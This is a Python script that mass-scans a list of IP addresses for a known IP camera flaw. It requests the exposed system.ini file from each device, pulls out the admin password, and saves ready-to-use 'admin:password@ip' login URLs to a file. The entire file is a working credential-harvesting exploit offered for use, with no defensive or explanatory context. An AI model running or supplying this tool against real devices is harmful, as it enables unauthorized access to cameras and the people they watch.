#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib.request, threading, socket, time, sys, base64

if len(sys.argv) != 3:
    print("\x1b[0;37mCorrect useage: python3 " + sys.argv[0].split("\\").pop() + " <input file> <output file>")
    sys.exit()

lock, finalprintout, timeout, creds, threads, threadcount, leak, total = threading.Lock(), "", 5, [], [], 10, "http://TARGET/system.ini?loginuse&loginpas", 0

def run(cmd):
    subprocess.call(cmd, shell=True)

# reads & outputs to < output.txt
inputfile = sys.argv[1]
outputfile = sys.argv[2]

list = open(inputfile, "r")
scan = list.read()
list.close()

scan = scan.split("\n")
while "\n" in scan:
    scan.remove("\n")
pretotal = len(scan)
def dumpcreds():
    global finalprintout
    global total
    global scan
    while len(scan) > 0:
        try:
            with lock:
                ip = scan.pop()
            with urllib.request.urlopen(leak.replace("TARGET", ip), None, timeout) as response:
                reply = str(response.read())
                camid = reply.split("\\x00")[0][2:]
                if reply.find("admin") != -1:
                    reply = reply[reply.find("admin"):]
                    while reply.find("\\x00") != -1:
                        reply = reply.replace("\\x00", "")
                    password = reply[5:reply.find("\\")]
                    if password.find("/") != -1:
                        password = password[:password.find("/")]
                    
                    if len(camid) > 20:
                        break

                    print("[+] Found     admin:" + password + "@" + ip + " " + camid)

                    with lock:
                        if password == "":
                            finalprintout += "http://admin@" + ip + "/" + " | " + camid + "\n"
                        elif camid == "":
                            finalprintout += ""
                        else:
                            finalprintout += "http://admin:" + password + "@" + ip + "/" + " | " + camid + "\n"
                        total += 1
                            
        except:
            pass

print("Dumping Credentials...")
time.sleep(1)
for i in range(0, threadcount+1):
    threads.append(threading.Thread(target=dumpcreds))

for thread in threads:
    try:
        thread.daemon = True
        thread.start()
    except:
        pass

for thread in threads:
    try:
        thread.join()
    except:
        pass

while 1:
    time.sleep(1)
    done = False
    for thread in threads:
        if thread.isAlive() == True:
            done = False
            break
        else:
            done = True
    if done == True:
        writingit = open(outputfile, "a")
        writingit.write(finalprintout)
        writingit.close()
        break

print(str(total) + " of out " + str(pretotal) + " " + str(round((total/pretotal)*100)) + "%")